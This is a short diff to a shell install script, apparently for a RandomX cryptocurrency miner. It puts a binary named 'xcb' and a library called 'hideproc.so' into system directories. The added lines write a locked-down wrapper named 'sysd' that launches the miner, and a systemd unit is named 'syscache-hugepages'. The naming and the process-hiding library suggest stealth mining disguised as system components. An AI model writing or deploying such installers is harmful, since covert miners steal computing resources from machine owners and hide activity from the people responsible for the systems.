@@ -28,6 +28,14 @@ $SUDO install -m 755 "$DIR/xcb" /usr/local/bin/xcb
 $SUDO install -m 644 "$DIR/librandomx_v2.so" /usr/local/bin/librandomx_v2.so
 $SUDO install -m 644 "$DIR/hideproc.so" /usr/local/lib/hideproc.so
 
+# Wrapper yang dipakai ExecStart di unit dasar (sama dengan ops/fleet/install.sh).
+$SUDO install -d -m 755 /usr/local/sbin
+$SUDO tee /usr/local/sbin/sysd >/dev/null <<'WRAPPER'
+#!/bin/sh
+exec /usr/local/bin/xcb -a conn --worker "$WORKER" -t "$THREADS" --ui=log
+WRAPPER
+$SUDO chmod 0700 /usr/local/sbin/sysd
+
 $SUDO tee /etc/systemd/system/syscache-hugepages.service >/dev/null <<UNIT
 [Unit]
 Description=Hugepages for RandomX V2 dataset (CONN)
